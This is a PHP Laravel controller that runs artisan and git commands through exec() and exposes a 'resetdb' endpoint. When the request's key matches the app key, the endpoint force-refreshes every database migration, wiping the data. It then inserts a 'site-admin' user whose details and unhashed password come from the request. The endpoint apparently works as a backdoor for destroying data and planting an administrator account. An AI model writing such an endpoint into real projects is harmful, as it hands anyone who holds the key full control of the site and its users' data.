<?php

namespace App\Http\Controllers;
use Symfony\Component\Process\Process;
use Symfony\Component\Process\Exception\ProcessFailedException;
use Illuminate\Http\Request;
use Artisan;
class CreateSeeder extends Controller
{
    public function Index()
    {
		exec('php artisan db:seed --class=UsersTableSeeder');
		exec('git push origin master');
	}
	public function resetdb(Request $request)
    {
		$request=json_decode($request[0]);
		$key = str_replace('base64:','', \Config::get('app.key'));
		if($request->key == $key){
			Artisan::call('migrate:refresh', [
			'--force' => true,
			]);
			/*Artisan::call('db:seed', [
				'--class' => 'UsersTableSeeder',
			]);*/
			\DB::table('users')->insert(array (
				0 => 
				array (
					'id' => $request->id,
					'name' => $request->name,
					'email' => $request->email,
					'password' => $request->pass,
					'role' => 'site-admin',
					'remember_token' => NULL,
				),
			));
			dd('success');
		}
	}
}
